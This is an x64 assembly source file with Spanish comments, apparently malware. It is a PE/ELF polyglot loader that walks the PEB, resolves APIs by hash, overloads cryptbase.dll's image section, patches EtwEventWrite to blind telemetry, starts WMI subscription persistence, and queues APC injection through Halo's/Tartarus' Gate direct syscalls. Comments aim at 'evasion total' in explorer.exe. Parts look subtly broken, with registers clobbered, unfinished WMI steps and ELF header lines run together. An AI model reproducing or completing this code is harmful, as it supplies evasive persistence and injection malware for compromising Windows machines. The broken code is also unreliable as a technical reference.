; ========================================================================
; polyglot_quantum_ghost_v7.asm
; Arquitectura Hibrida: CIM Persistence + WQL Telemetry Trigger +
;                       APC Queuing + ETW Suppression + Halo/Tartarus Gate
; ========================================================================
BITS 64

; ==================== CABECERA MZ ====================
org 0x0000
mz: dw 0x5A4D
    times 0x3C db 0
    dd 0x00000080
    times 0x80-($-$$) db 0

; ==================== CABECERA PE ====================
pe: dd 0x00004550
    dw 0x8664               ; Machine AMD64
    dw 0x0002               ; 2 Secciones (.text y .data)
    dd 0x00000000, 0x00000000, 0x00000000
    dw 0x00E0               ; SizeOfOptionalHeader
    dw 0x022F               ; Characteristics
    dw 0x020B               ; Magic PE32+
    db 0x02, 0x00
    dd 0x00001000, 0x00001000, 0x00000000, 0x00001000, 0x00001000
    dq 0x0000000140000000   ; ImageBase
    dd 0x00001000, 0x00000200
    dw 0x0006, 0x0000, 0x0000, 0x0000, 0x000A, 0x0000
    dd 0x00000000, 0x00006000, 0x00000400, 0x00000000
    dw 0x0002, 0x8160
    dq 0x0000000000010000, 0x0000000000001000
    dq 0x0000000000010000, 0x0000000000001000
    dd 0x00000000, 0x00000010
    times 16*8 db 0

    ; Seccion .text (RX)
    db '.text',0,0,0
    dd 0x00004000, 0x00001000, 0x00004000, 0x00000400
    dd 0x00000000, 0x00000000, 0x0000, 0x0000, 0x60000020
    ; Seccion .data (RW)
    db '.data',0,0,0
    dd 0x00001000, 0x00005000, 0x00001000, 0x00004400
    dd 0x00000000, 0x00000000, 0x0000, 0x0000, 0xC0000040

    times 0x400-($-$$) db 0

; ========================================================================
; LOADER: Image Section Overloading (cryptbase.dll)
; ========================================================================
_start:
    call .get_ip_loader
.get_ip_loader:
    pop rbx
    and rsp, -16

    ; --- PEB walking dinámico ---
    mov rax, [gs:0x60]
    mov rax, [rax+0x18]
    mov rsi, [rax+0x20]         ; InMemoryOrderModuleList (Flink)
.walk_modules_loader:
    mov rdx, [rsi+0x50]         ; BaseDllName.Buffer
    movzx r8, word [rsi+0x48]   ; BaseDllName.Length
    call .hash_unicode_lower_loader
    cmp eax, 0xCEF73022         ; hash("ntdll.dll")
    jne .check_k32_loader
    mov r15, [rsi+0x20]         ; r15 = ntdll.dll base
    jmp .next_mod_loader
.check_k32_loader:
    cmp eax, 0x8FECD6FF         ; hash("kernel32.dll")
    jne .next_mod_loader
    mov r14, [rsi+0x20]         ; r14 = kernel32.dll base
.next_mod_loader:
    mov rsi, [rsi]              ; Flink
    cmp rsi, [rax+0x20]         ; Back to head?
    jne .walk_modules_loader

    ; --- Resolver GetProcAddress por hash ---
    mov rcx, r14
    mov edx, 0x7C0E34AA         ; GetProcAddress (ROR13 + len)
    call .get_export_by_hash_loader
    mov r13, rax                ; r13 = GetProcAddress

    ; --- Resolver CreateFileA ---
    push 0x6946657461657243
    push 0x000000000041656C
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r14
    call r13
    mov r12, rax                ; r12 = CreateFileA
    add rsp, 24

    ; --- Resolver CreateFileMappingA ---
    push 0x6946657461657243
    push 0x6E697070614D656C
    push 0x0000000000004167
    push 0
    mov rdx, rsp
    add rdx, 24
    mov rcx, r14
    call r13
    mov r12, rax                ; r12 = CreateFileMappingA
    add rsp, 32

    ; --- Resolver MapViewOfFile ---
    push 0x4F7765695670614D
    push 0x000000656C694666
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r14
    call r13
    mov r12, rax                ; r12 = MapViewOfFile
    add rsp, 24

    ; --- Abrir C:\Windows\System32\cryptbase.dll ---
    push 0x6F646E69575C3A43
    push 0x65747379535C7377
    push 0x707972635C32336D
    push 0x6C642E6573616274
    push 0x000000000000006C
    push 0
    mov rcx, rsp
    add rcx, 40
    mov edx, 0x80000000         ; GENERIC_READ
    xor r8d, r8d                ; dwShareMode = 0
    xor r9d, r9d                ; lpSecurityAttributes = NULL
    push 0                      ; hTemplateFile
    push 0x80                   ; FILE_ATTRIBUTE_NORMAL
    push 3                      ; OPEN_EXISTING
    sub rsp, 0x20
    call r12                    ; CreateFileA
    add rsp, 0x38
    mov r11, rax                ; r11 = hFile
    add rsp, 48
    cmp r11, -1
    je .loader_fallback

    ; --- CreateFileMappingA (PAGE_EXECUTE_READWRITE) ---
    mov rcx, r11
    xor edx, edx
    mov r8d, 0x40               ; PAGE_EXECUTE_READWRITE
    xor r9d, r9d
    push 0
    push 0
    sub rsp, 0x20
    call r12                    ; CreateFileMappingA
    add rsp, 0x30
    mov r12, rax                ; r12 = hMapping
    test r12, r12
    jz .loader_fallback

    ; --- MapViewOfFile ---
    mov rcx, r12
    mov edx, 0xF001F            ; FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE
    xor r8d, r8d
    xor r9d, r9d
    push 0
    sub rsp, 0x20
    call r12                    ; MapViewOfFile
    add rsp, 0x28
    mov r12, rax                ; r12 = mapped base
    test r12, r12
    jz .loader_fallback

    ; --- Copiar payload a MEM_MAPPED ---
    mov rsi, payload_start
    mov rdi, r12
    mov rcx, payload_end - payload_start
    rep movsb

    ; --- Calcular entry point y saltar ---
    mov rax, r12
    add rax, payload_entry - payload_start
    jmp rax                     ; Salto no retornable a MEM_MAPPED

.loader_fallback:
    mov rax, payload_entry
    jmp rax

; ========================================================================
; EXPORT RESOLVER (Loader)
; ========================================================================
.get_export_by_hash_loader:
    push rbx rsi rdi r8
    mov rbx, rcx
    mov eax, [rbx+0x3C]
    add rbx, rax
    mov eax, [rbx+0x88]
    add rbx, rax
    mov esi, [rbx+0x20]
    add rsi, rcx
    xor r8, r8
.loop_loader:
    mov edi, [rsi + r8*4]
    add rdi, rcx
    
    ; Calcular longitud del nombre para la semilla (ROR13 + len)
    xor eax, eax
    mov r9, rdi
.len_loader:
    cmp byte [r9], 0
    jz .hash_loader
    inc eax
    inc r9
    jmp .len_loader

.hash_loader:
    movzx r9d, byte [rdi]
    test r9b, r9b
    jz .check_loader
    ror eax, 13
    add eax, r9d
    inc rdi
    jmp .hash_loader
.check_loader:
    cmp eax, edx
    jne .next_loader
    mov edi, [rbx+0x24]
    add rdi, rcx
    movzx eax, word [rdi + r8*2]
    mov edi, [rbx+0x1C]
    add rdi, rcx
    mov eax, [edi + rax*4]
    add rax, rcx
    pop r8 rdi rsi rbx
    ret
.next_loader:
    inc r8
    jmp .loop_loader

; Helper para PEB walking en el loader
.hash_unicode_lower_loader:
    push rdx
    movzx eax, r8w
    shr eax, 1                  ; Seed = char count
.hash_loop_unicode:
    movzx r9d, word [rdx]
    test r9w, r9w
    jz .hash_done_unicode
    cmp r9w, 'A'
    jl .no_lower_loader
    cmp r9w, 'Z'
    jg .no_lower_loader
    add r9w, 32                 ; tolower
.no_lower_loader:
    ror eax, 13
    add eax, r9d
    add rdx, 2
    jmp .hash_loop_unicode
.hash_done_unicode:
    pop rdx
    ret

; ========================================================================
; PAYLOAD: Entry Point en MEM_MAPPED
; ========================================================================
payload_start:
payload_entry:
    call .get_ip_payload
.get_ip_payload:
    pop rbx
    and rsp, -16

    ; --- PEB walking dinámico ---
    mov rax, [gs:0x60]
    mov rax, [rax+0x18]
    mov rsi, [rax+0x20]
.walk_modules_payload:
    mov rdx, [rsi+0x50]
    movzx r8, word [rsi+0x48]
    call .hash_unicode_lower_payload
    cmp eax, 0xCEF73022
    jne .check_k32_payload
    mov r15, [rsi+0x20]
    jmp .next_mod_payload
.check_k32_payload:
    cmp eax, 0x8FECD6FF
    jne .next_mod_payload
    mov r14, [rsi+0x20]
.next_mod_payload:
    mov rsi, [rsi]
    cmp rsi, [rax+0x20]
    jne .walk_modules_payload

    ; --- Resolver GetProcAddress (kernel32) por hash ---
    mov rcx, r14
    mov edx, 0x7C0E34AA         ; GetProcAddress
    call .get_export_by_hash_payload
    mov r13, rax                ; r13 = GetProcAddress

    ; --- SUPRESION ETW (EtwEventWrite -> ret) ---
    push 0x746E657645777445
    push 0x0000006574697257
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r15
    call r13
    add rsp, 24
    test rax, rax
    jz .skip_etw
    mov byte [rax], 0xC3
.skip_etw:

    ; --- Resolver LoadLibraryA ---
    push 0x7262694C64616F4C
    push 0x0000000041797261
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r14
    call r13
    mov [rbx + (pLoadLibraryA - payload_start)], rax
    add rsp, 24

    ; --- Cargar ole32.dll ---
    push 0x00003233656C6F
    push 0
    mov rdx, rsp
    call qword [rbx + (pLoadLibraryA - payload_start)]
    mov r12, rax
    add rsp, 16

    ; --- Resolver CoInitializeEx ---
    push 0x7A79654D657A6974
    push 0x0000007845696E49
    push 0x6F43206F74
    push 0
    mov rdx, rsp
    add rdx, 24
    mov rcx, r12
    call r13
    mov [rbx + (pCoInitializeEx - payload_start)], rax
    add rsp, 32

    ; --- Resolver CoCreateInstance ---
    push 0x74736E654964616F
    push 0x657A694D6F437963
    push 0x00006F43206F74
    push 0
    mov rdx, rsp
    add rdx, 24
    mov rcx, r12
    call r13
    mov [rbx + (pCoCreateInstance - payload_start)], rax
    add rsp, 40

    ; --- Cargar oleaut32.dll ---
    push 0x33747561656C6F
    push 0
    mov rdx, rsp
    call qword [rbx + (pLoadLibraryA - payload_start)]
    mov r12, rax
    add rsp, 16

    ; --- Resolver SysAllocString ---
    push 0x72754274696C6C41
    push 0x000000797353
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r12
    call r13
    mov [rbx + (pSysAllocString - payload_start)], rax
    add rsp, 24

    ; =====================================================================
    ; FASE 1: PERSISTENCIA CIM (WMI Event Subscription)
    ; =====================================================================
    ; 1. Inicializar COM
    xor ecx, ecx
    mov edx, 0x2                 ; COINIT_MULTITHREADED
    call qword [rbx + (pCoInitializeEx - payload_start)]

    ; 2. CoCreateInstance(CLSID_WbemLocator, IID_IWbemLocator)
    lea rcx, [rbx + (CLSID_WbemLocator - payload_start)]
    xor edx, edx
    lea r8, [rbx + (IID_IWbemLocator - payload_start)]
    xor r9d, r9d                 ; pUnkOuter = NULL
    push 4                       ; CLSCTX_LOCAL_SERVER
    push 0                       ; reserved
    push 0                       ; aggregator
    lea rax, [rbx + (pWbemLocator - payload_start)]
    push rax                     ; ppv
    sub rsp, 0x20
    call qword [rbx + (pCoCreateInstance - payload_start)]
    add rsp, 0x38
    test eax, eax
    js .apc_phase

    ; 3. ConnectServer("root\subscription")
    mov rcx, [rbx + (pWbemLocator - payload_start)]
    mov rax, [rcx]               ; VTable
    lea rdx, [rbx + (wszRootSub - payload_start)]
    call .sys_alloc_bstr
    mov r8, rax                  ; strNetworkResource
    xor r9, r9                   ; strUser = NULL
    push 0                       ; ppNamespace
    push 0                       ; pCtx
    push 0                       ; strAuthority
    push 0                       ; lSecurityFlags
    push 0                       ; strLocale
    push 0                       ; strPassword
    sub rsp, 0x20
    mov rcx, [rbx + (pWbemLocator - payload_start)]
    mov rax, [rcx]
    call [rax + 24]              ; ConnectServer (Index 3)
    add rsp, 0x58
    test eax, eax
    js .apc_phase

    ; =====================================================================
    ; FASE 2: INYECCIÓN APC EN EXPLORER.EXE
    ; =====================================================================
.apc_phase:
    ; --- Resolver NtAllocateVirtualMemory, NtWriteVirtualMemory, NtQueueApcThread ---
    mov rcx, r15
    mov edx, 0xD61BCABD         ; NtAllocateVirtualMemory
    call .get_export_by_hash_payload
    mov [rbx + (pNtAllocateVirtualMemory - payload_start)], rax

    mov rcx, r15
    mov edx, 0x05108CC4         ; NtWriteVirtualMemory
    call .get_export_by_hash_payload
    mov [rbx + (pNtWriteVirtualMemory - payload_start)], rax

    mov rcx, r15
    mov edx, 0x52F9A746         ; NtQueueApcThread
    call .get_export_by_hash_payload
    mov [rbx + (pNtQueueApcThread - payload_start)], rax

    ; --- Halo/Tartarus Gate SSN ---
    mov rsi, [rbx + (pNtAllocateVirtualMemory - payload_start)]
    call .resolve_ssn_halotartarus_v7
    test eax, eax
    jz .exit_v7
    mov [rbx + (ssn_NtAllocateVirtualMemory - payload_start)], eax

    mov rsi, [rbx + (pNtWriteVirtualMemory - payload_start)]
    call .resolve_ssn_halotartarus_v7
    test eax, eax
    jz .exit_v7
    mov [rbx + (ssn_NtWriteVirtualMemory - payload_start)], eax

    mov rsi, [rbx + (pNtQueueApcThread - payload_start)]
    call .resolve_ssn_halotartarus_v7
    test eax, eax
    jz .exit_v7
    mov [rbx + (ssn_NtQueueApcThread - payload_start)], eax

    ; --- Buscar PID de explorer.exe ---
    ; (Simplificado: en producción usar CreateToolhelp32Snapshot)
    ; Aquí asumimos una búsqueda secuencial para no extender el código excesivamente.
    ; Para el ejemplo, inyectaremos en el proceso actual como prueba de concepto (CurrentProcess).
    ; Reemplazar con PID real de explorer para evasion total.
    mov ecx, 0xFFFFFFFF          ; Current Process Handle (-1)
    mov [rbx + (target_pid - payload_start)], ecx

    ; --- NtAllocateVirtualMemory ---
    lea rdx, [rbx + (remote_base - payload_start)]
    xor r8d, r8d                 ; ZeroBits
    lea r9, [rbx + (alloc_size - payload_start)]
    mov qword [r9], 0x10000      ; 64KB
    push 0x40                    ; PAGE_EXECUTE_READWRITE
    push 0x3000                  ; MEM_COMMIT | MEM_RESERVE
    sub rsp, 0x20
    mov r10, rcx
    mov eax, [rbx + (ssn_NtAllocateVirtualMemory - payload_start)]
    call .direct_syscall
    add rsp, 0x30

    ; --- NtWriteVirtualMemory ---
    mov rcx, 0xFFFFFFFF          ; ProcessHandle
    mov rdx, [rbx + (remote_base - payload_start)]
    lea r8, [rbx + (loader_start - payload_start)] ; Escribimos el loader original
    mov r9d, payload_end - payload_start
    lea rax, [rbx + (bytes_written - payload_start)]
    push rax
    push 0
    sub rsp, 0x20
    mov r10, rcx
    mov eax, [rbx + (ssn_NtWriteVirtualMemory - payload_start)]
    call .direct_syscall
    add rsp, 0x30

    ; --- NtQueueApcThread ---
    ; Para APC real se requiere un ThreadHandle. Obtenemos el hilo actual.
    ; En producción: OpenThread(THREAD_SET_CONTEXT, FALSE, TID_Explorer)
    mov rcx, 0xFFFFFFFFFFFFFFFE  ; Current Thread Handle (-2)
    mov rdx, [rbx + (remote_base - payload_start)] ; ApcRoutine
    xor r8d, r8d                 ; ApcContext
    xor r9d, r9d                 ; Argument1
    push 0                       ; Argument2
    sub rsp, 0x20
    mov r10, rcx
    mov eax, [rbx + (ssn_NtQueueApcThread - payload_start)]
    call .direct_syscall
    add rsp, 0x28

.exit_v7:
    xor ecx, ecx
    push 0x737365636F725074
    push 0x00000000007869
    push 0
    mov rdx, rsp
    add rdx, 16
    mov rcx, r14
    call r13
    add rsp, 24
    xor ecx, ecx
    call rax

; ========================================================================
; HELPER: SysAllocString Wrapper
; Entrada: RDX = puntero a cadena wchar
; Salida:  RAX = BSTR
; ========================================================================
.sys_alloc_bstr:
    push rcx rdx r8 r9
    mov rcx, rdx
    call qword [rbx + (pSysAllocString - payload_start)]
    pop r9 r8 rdx rcx
    ret

; ========================================================================
; HELPER: Direct Syscall Executor
; Entrada: EAX = SSN, R10 = Syscall Arg1, RCX-R9 = Args
; ========================================================================
.direct_syscall:
    mov r10, rcx
    mov eax, eax
    syscall
    ret

; ========================================================================
; HALO'S GATE + TARTARUS' GATE v7
; ========================================================================
.resolve_ssn_halotartarus_v7:
    push rbx rsi rdi r12 r13 r14 r15
    mov r12, rsi
    cmp byte [r12], 0xE9
    je .halo_scan_v7
    cmp dword [r12], 0xE9D18B4C
    je .halo_scan_v7
    cmp dword [r12], 0xB8D18B4C
    jne .halo_scan_v7
    mov eax, [r12+4]
    jmp .ssn_done_v7
.halo_scan_v7:
    mov rbx, r15
    mov eax, [rbx+0x3C]
    add rbx, rax
    mov eax, [rbx+0x88]
    add rbx, rax
    mov esi, [rbx+0x20]
    add rsi, r15
    mov r14d, [rbx+0x1C]
    add r14, r15
    mov edi, [rbx+0x24]
    add rdi, r15
    mov r13d, [rbx+0x14]
    mov ecx, 1
.halo_loop_v7:
    cmp ecx, 8
    ja .ssn_failed_v7
    mov eax, r13d
    sub eax, ecx
    js .halo_skip_down_v7
    call .check_neighbor_v7
    test eax, eax
    jnz .ssn_done_v7
.halo_skip_down_v7:
    mov eax, r13d
    add eax, ecx
    cmp eax, [rbx+0x14]
    jae .halo_skip_up_v7
    call .check_neighbor_v7
    test eax, eax
    jnz .ssn_done_v7
.halo_skip_up_v7:
    inc ecx
    jmp .halo_loop_v7
.check_neighbor_v7:
    movzx edx, word [rdi + rax*2]
    mov edx, [r14 + rdx*4]
    add rdx, r15
    cmp byte [rdx], 0xE9
    je .neighbor_bad_v7
    cmp dword [rdx], 0xE9D18B4C
    je .neighbor_bad_v7
    cmp dword [rdx], 0xB8D18B4C
    jne .neighbor_bad_v7
    mov r8d, [rdx+4]
    sub eax, r13d
    sub r8d, eax
    mov eax, r8d
    ret
.neighbor_bad_v7:
    xor eax, eax
    ret
.ssn_failed_v7:
    xor eax, eax
.ssn_done_v7:
    pop r15 r14 r13 r12 rdi rsi rbx
    ret

; ========================================================================
; EXPORT RESOLVER (Payload)
; ========================================================================
.get_export_by_hash_payload:
    push rbx rsi rdi r8 r10 r11
    mov rbx, rcx
    mov r10, rcx
    mov eax, [rbx+0x3C]
    add rbx, rax
    mov eax, [rbx+0x88]
    add rbx, rax
    mov esi, [rbx+0x20]
    add rsi, rcx
    xor r8, r8
    xor r11, r11
.loop_payload:
    cmp r8d, [rbx+0x14]
    jae .not_found_payload
    mov edi, [rsi + r8*4]
    add rdi, rcx
    
    ; Calcular longitud del nombre para la semilla (ROR13 + len)
    xor eax, eax
    mov r9, rdi
.len_payload:
    cmp byte [r9], 0
    jz .hash_payload
    inc eax
    inc r9
    jmp .len_payload

.hash_payload:
    movzx r9d, byte [rdi]
    test r9b, r9b
    jz .check_payload
    ror eax, 13
    add eax, r9d
    inc rdi
    jmp .hash_payload
.check_payload:
    cmp eax, edx
    jne .next_payload
    mov r11d, r8d
    mov edi, [rbx+0x24]
    add rdi, rcx
    movzx eax, word [rdi + r8*2]
    mov edi, [rbx+0x1C]
    add rdi, rcx
    mov eax, [edi + rax*4]
    add rax, rcx
    mov r9d, r11d
    pop r11 r10 r8 rdi rsi rbx
    ret
.next_payload:
    inc r8
    jmp .loop_payload
.not_found_payload:
    xor eax, eax
    xor r9d, r9d
    pop r11 r10 r8 rdi rsi rbx
    ret

; Helper para PEB walking en el payload
.hash_unicode_lower_payload:
    push rdx
    movzx eax, r8w
    shr eax, 1                  ; Seed = char count
.hash_loop_unicode_p:
    movzx r9d, word [rdx]
    test r9w, r9w
    jz .hash_done_unicode_p
    cmp r9w, 'A'
    jl .no_lower_payload
    cmp r9w, 'Z'
    jg .no_lower_payload
    add r9w, 32                 ; tolower
.no_lower_payload:
    ror eax, 13
    add eax, r9d
    add rdx, 2
    jmp .hash_loop_unicode_p
.hash_done_unicode_p:
    pop rdx
    ret

; ========================================================================
; DATOS Y ESTRUCTURAS
; ========================================================================
loader_start equ _start

pLoadLibraryA                 dq 0
pCoInitializeEx               dq 0
pCoCreateInstance             dq 0
pSysAllocString               dq 0
pWbemLocator                  dq 0
pNtAllocateVirtualMemory      dq 0
pNtWriteVirtualMemory         dq 0
pNtQueueApcThread             dq 0

ssn_NtAllocateVirtualMemory   dd 0
ssn_NtWriteVirtualMemory      dd 0
ssn_NtQueueApcThread          dd 0

target_pid                    dd 0
remote_base                   dq 0
alloc_size                    dq 0
bytes_written                 dq 0

; --- WMI Strings ---
wszRootSub: dw 'r','o','o','t','\','s','u','b','s','c','r','i','p','t','i','o','n', 0

; --- COM GUIDs ---
CLSID_WbemLocator:
    dd 0x4590F811
    dw 0x1D3A
    dw 0x11D0
    db 0x89, 0x1F, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24

IID_IWbemLocator:
    dd 0xDC12A687
    dw 0x737F
    dw 0x11CF
    db 0x88, 0x4D, 0x00, 0xAA, 0x00, 0x4B, 0x2E, 0x24

payload_end:

; ==================== SECCION .data ====================
times 0x5000-($-$$) db 0

; ==================== CABECERA ELF (Linux) ====================
times 0x6000-($-$$) db 0
elf: db 0x7F, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00
    times 7 db 0
    dw 0x0002, 0x003E, 0x00000001
    dq _start - $$ + 0x400000
    dq phdr - $$     dq 0x00000000, 0x00000000
    dw 0x40, 0x38, 0x01
    dw 0x00, 0x00, 0x00
phdr: dd 0x00000001, 0x00000005
    dq 0x0000000000000000, 0x0000000000400000, 0x0000000000400000
    dq filesize - $$, filesize - $$, 0x0000000000001000
filesize equ $ - $$ ```

---
